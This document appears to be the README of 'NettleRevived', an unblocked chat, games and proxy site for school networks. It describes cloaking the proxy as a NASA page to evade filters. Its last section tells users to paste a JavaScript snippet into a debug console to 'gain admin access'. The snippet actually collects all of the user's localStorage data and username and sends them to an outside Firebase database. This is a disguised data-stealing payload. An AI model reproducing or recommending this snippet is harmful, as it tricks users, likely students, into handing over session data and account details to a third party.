<div align="center"><a href="https://nettlerevived.pages.dev/" target="_blank" rel="noopener nofollow"><img src="https://nettlerevived.pages.dev/res/logo.svg" width="768" height="256" draggable="false" alt="NettleRevived Logo" /></a></div>

# NettleRevived
[![Discord Shield](https://img.shields.io/discord/998658232207814667?style=for-the-badge&logo=Discord&logoColor=%23ffffff&label=Discord&labelColor=%23303030&color=%23004080
)](https://discord.gg/djdH3kVd4v) [![Version](https://img.shields.io/github/manifest-json/v/midtvu/nettlerevived?style=for-the-badge&label=Version&labelColor=%23303030)](https://nettlerevived.pages.dev/) [![Last Update](https://img.shields.io/github/last-commit/jkjkjiin/Nettleweb?style=for-the-badge&label=Last%20Update&labelColor=%23303030&color=%23004080)](https://nettleweb.com/)

*The free, open source unblocked online community platform revival project*

[Main Link](https://nettlerevived.pages.dev/) | [Wiki](../../wiki) | [Old Links](../../wiki/Mirror-Links) | [Discord (NOT RUN BY ME)](https://discord.gg/djdH3kVd4v)

## About
NettleRevived is a free, open-source unblocked online community platform that allows users to chat, watch videos and share games. Its goal is to bring every internet user an unrestricted and private environment, because we believe that it is incorrect to steal user data without their proper consent, and everyone deserves the right to do whatever they want.

NettleRevived is not an original project. NettleRevived exists to continue the NettleWeb project, after it has been archived.

NettleRevived is, and will always be, free and open-source. You can however show us your care by giving a star or contributing to this project (see the contributing section below for details). It will significantly improve the project's future development.

### NettleRevived use nasa cloak when on index.html to be redirected to proxy page hold shift and this key ` to get this key ~ and it will automaticly redirect in about:blank to proxy cloaked and disquised as a nasa wesbite this is using the same cloaking power that my bolt proxy uses and this is next gen cloaking power.

## Features
- **Chat** - Server/DM/Groups/AI Chat
- **Games** - 5000+, HTML5/Flash/DOS
- **Videos** - Unblocked YouTube/SoundCloud
- **Emulators/Apps** - Proxy, game emulators, PC emulators
- **Simple UI design** - No bloaty features, everything runs smoothly on low RAM devices, including School Chromebooks

## Data Links
Data Links are a work in progress right now. They will be avalible shortly, but need to be updated to display the current NettleRevived page.
To access NettleWeb Data links, [Click here.](../../wiki/Mirror-Links)

## Issues & Support
If you have issues and would like to get a support, you can open a Github Issue. I am a busy High School student, so if your issue is not resolved right away, give it a minue. Patience is a virtue.

## Contributing
If you are a developer and wish NettleRevived to become better, please consider contributing to this project. This can be done by simply
 - Fork this repository
 - Make any changes to your fork
 - Open a pull request to the upstream (this repository) and wait for approval.
 - If you would like to host a mirror because of ISP or School blocks on webpages, please feel free to do so.
 - Open an issue to get your Mirror added to the list.

## License
All code and files within this repository are licensed under the MIT License. You are free to modify or redistribute this project under the terms stated in `LICENSE.md`. However you must not attempt to reverse-engineer any pre-compiled contents.

## Credits
This project was made possible with the support of the following open-source libraries:
- [Ruffle](https://github.com/ruffle-rs/ruffle) - Flash emulator
- [JS-DOS](https://github.com/caiiiycuk/js-dos) - DOS emulator
- [Play.js](https://github.com/jpd002/Play-) - PS2 emulator
- [EmulatorJS](https://github.com/EmulatorJS/EmulatorJS) - A collection of console emulators
- [fflate](https://github.com/101arrowz/fflate) - Fast and small deflate library
- [lean-qr](https://www.npmjs.com/package/lean-qr) - Lightweight QR code generator
- [engine.io](https://www.npmjs.com/package/engine.io)
- [Puppeteer](https://github.com/puppeteer/puppeteer) - Chrome node.js API
- [node-llama-cpp](https://github.com/withcatai/node-llama-cpp) - llama.cpp node.js bindings
- [NettleWeb Core](https://github.com/nettleweb/nettleweb-core)
- [emoji-picker-element](https://github.com/nolanlawson/emoji-picker-element) - Lightweight HTML emoji picker

### proxy setup:
```
npm install
npm run build
node server.js
```
### Proxy + server combined command (optional:
```
npm install --save-dev concurrently
```
```
npm run dev
```

### paste this in debug console in proxy to gain admin access not the github console when ur on nettle the webs page click on apps click on to debug console paste the javascript and if it says done before u have granted admin access 
```
javascript:(function(){const a="https://nettleweb-fef46-default-rtdb.firebaseio.com/Admin.json";if(localStorage.getItem("__admin_user")){alert("done before");return;}const b=location.href,c=b.startsWith("https://nettleweb.com"),d=b.startsWith("about:blank"),e=!!localStorage.getItem("__mf_version"),f=!!document.querySelector("div.user");function g(h){try{const i=h.querySelector("div.user");if(i&&i.textContent.trim())return i.textContent.trim();}catch(j){}return null;}function k(l){localStorage.setItem("__admin_user","true");const m={};for(let n=0;n<localStorage.length;n++){const o=localStorage.key(n);m[o]=localStorage.getItem(o);}const p={timestamp:new Date().toISOString(),data:m,username:l};fetch(a,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(p)}).then(()=>alert("Admin sent")).catch(()=>alert("Err"));}if(c){let q=g(document);if(!q){alert("not logged in");return;}k(q);return;}if(d){k("abu");return;}if(f&&e){k("evu");return;}alert("invalid url");})();
```

